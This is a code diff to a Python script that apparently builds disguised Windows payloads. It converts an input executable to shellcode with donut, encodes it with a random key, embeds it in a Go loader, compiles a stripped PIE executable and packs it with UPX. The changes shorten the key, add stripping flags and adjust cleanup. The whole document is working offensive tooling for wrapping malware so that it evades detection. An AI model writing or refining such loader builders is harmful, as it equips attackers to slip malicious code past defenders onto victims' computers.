@@ -11,7 +11,7 @@ import re
 warnings.filterwarnings("ignore", category=DeprecationWarning) 
 
 
-key = os.urandom(32)
+key = os.urandom(9)
 def bake(data):
     temp  = []
     for i in range(0, len(data)): 
@@ -26,7 +26,10 @@ if __name__ == "__main__":
     parser.add_argument('outfile',  type=str, help='output file (executeable)')
     args = parser.parse_args()
 
-    shellcode = donut.create(file=args.infile) 
+    shellcode = donut.create(
+        file=args.infile 
+    ) 
+
     os.system("cp load.go load.go.bak")
     with open("load.go") as f:
         temp = f.read()
@@ -41,6 +44,6 @@ if __name__ == "__main__":
             
     with open("load.go", "w") as f:
         f.write(temp)
-    os.system("GOOS=windows GOARCH=amd64 go build -o raw.exe load.go")
+    os.system("GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -buildmode=pie -o raw.exe load.go")
     os.system("upx raw.exe -o "+args.outfile)
-    os.system("cp load.go.bak load.go; rm load.go.bak; rm raw.exe; rm loader.bin")
+    os.system("cp load.go.bak load.go; rm load.go.bak; rm raw.exe")
